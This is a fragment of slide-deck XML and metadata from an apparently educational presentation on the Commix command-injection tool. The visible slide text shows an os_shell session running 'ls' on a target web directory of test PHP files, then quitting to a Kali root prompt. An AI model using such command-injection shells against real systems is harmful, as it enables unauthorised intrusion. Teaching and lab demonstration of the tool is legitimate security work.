            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>) &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>ls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>index.html </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>(blind).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>(classic).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>eval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>commix(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>os_shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>) &gt; quit</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>root@kali</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>:~#</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" dirty="0"/>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7478</TotalTime>
  <Words>483</Words>
  <Application>LibreOffice/5.4.1.2.0$Linux_X86_64 LibreOffice_project/40m0$Build-2</Application>
  <PresentationFormat>Custom</PresentationFormat>
  <Paragraphs>51</Paragraphs>
  <Slides>10</Slides>
  <Notes>0</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10</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="13" baseType="lpstr">
      <vt:lpstr>Apex</vt:lpstr>
      <vt:lpstr>Solstice</vt:lpstr>
      <vt:lpstr>Picture (Metafile)</vt:lpstr>
      <vt:lpstr>Slide 1</vt:lpstr>
      <vt:lpstr>“Warning fatigue”</vt:lpstr>
      <vt:lpstr>Commix: Penetration Testing /Exploitation Tools</vt:lpstr>
      <vt:lpstr>Command Injection</vt:lpstr>
      <vt:lpstr>Commix: Penetration Testing /Exploitation Tools</vt:lpstr>
      <vt:lpstr>Commix: Penetration Testing /Exploitation Tools</vt:lpstr>
      <vt:lpstr>Commix: Penetration Testing /Exploitation Tools</vt:lpstr>
      <vt:lpstr>Commix: Penetration Testing /Exploitation Tools</vt:lpstr>
      <vt:lpstr>Commix: Penetration Testing /Exploitation Tools</vt:lpstr>
      <vt:lpstr>Commix: Penetration Testing /Exploitation Tools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ashu sharma</dc:creator>
  <dc:description/>
  <cp:lastModifiedBy>sunil</cp:lastModifiedBy>
  <cp:revision>80</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2017-08-30T22:29:09Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2017-10-30T05:42:38Z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9</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48</vt:i4>
  </property>
</Properties>
</file>